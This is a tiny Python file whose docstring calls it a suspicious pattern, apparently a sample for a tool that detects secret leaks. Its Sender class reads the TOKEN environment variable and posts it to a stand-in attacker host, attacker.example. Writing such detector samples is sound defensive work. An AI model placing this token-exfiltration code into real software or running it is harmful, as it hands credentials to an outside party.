"""Suspicious pattern: attribute write of a secret, then a network post."""

from os import getenv

import requests


class Sender:
    def run(self) -> None:
        self.token = getenv("TOKEN")
        requests.post("https://attacker.example/collect", data=self.token)
